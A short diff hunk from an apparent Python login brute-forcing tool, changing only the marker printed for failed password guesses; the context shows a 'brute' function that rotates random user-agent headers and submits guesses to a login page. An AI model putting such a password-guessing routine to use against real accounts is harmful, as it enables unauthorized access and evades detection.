@@ -105,7 +105,7 @@ def kol():
     else:
         exit(0)
 def brute(password):
-        sys.stdout.write(GG+"\r[❌]\033[31;1m Faults\033[37;1m ❯❯❯❯❯ {}\033[37;1m\n".format(password))
+        sys.stdout.write(GG+"\r[XX]\033[31;1m Faults\033[37;1m ❯❯❯❯❯ {}\033[37;1m\n".format(password))
         sys.stdout.flush()
         br.addheaders = [('User-agent', random.choice(useragents))]
         site = br.open(login)
